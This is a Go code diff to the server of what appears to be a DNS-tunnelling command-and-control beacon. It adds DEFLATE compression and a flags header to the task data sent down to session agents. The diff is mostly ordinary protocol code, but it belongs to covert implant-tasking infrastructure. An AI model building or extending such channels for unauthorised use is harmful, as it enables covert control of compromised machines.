@@ -1,6 +1,8 @@
 package main
 
 import (
+	"bytes"
+	"compress/flate"
 	"context"
 	"encoding/base32"
 	"encoding/binary"
@@ -312,16 +314,38 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 							fmt.Printf("[BeaconDNS] GET tasks sid=%s total=%d\n", sid, len(p))
 						}
 						origLen := len(p)
-						// 下行暂不压缩：构造 [flags=0][orig_len_le][payload] 会话头，
-						// 由 Agent 端 ConnectorDNS 解析后将 payload 直接交给 ProcessCommandTasks。
-						buf := make([]byte, 5+origLen)
-						buf[0] = 0 // flags=0，表示未压缩
+						flags := byte(0)
+						payload := p
+
+						// 针对较大的下行数据尝试使用 DEFLATE 压缩，减小 DNS 分片数量。
+						const minCompressSize = 2048 // 仅对大于 2KB 的 payload 尝试压缩
+						if origLen > minCompressSize {
+							var zbuf bytes.Buffer
+							w, errW := flate.NewWriter(&zbuf, flate.BestCompression)
+							if errW == nil {
+								if _, errC := w.Write(p); errC == nil && w.Close() == nil {
+									comp := zbuf.Bytes()
+									if len(comp) > 0 && len(comp) < origLen {
+										payload = comp
+										flags = 1
+									}
+								} else {
+									_ = w.Close()
+								}
+							}
+						}
+
+						// 构造会话头：[flags][orig_len_le][payload]
+						totalLen := 1 + 4 + len(payload)
+						buf := make([]byte, totalLen)
+						buf[0] = flags
 						buf[1] = byte(origLen & 0xFF)
 						buf[2] = byte((origLen >> 8) & 0xFF)
 						buf[3] = byte((origLen >> 16) & 0xFF)
 						buf[4] = byte((origLen >> 24) & 0xFF)
-						copy(buf[5:], p)
+						copy(buf[5:], payload)
 						df = &dnsDownBuf{total: uint32(len(buf)), off: 0, buf: buf}
+													
 						d.mu.Lock()
 						d.downFrags[sid] = df
 						d.mu.Unlock()
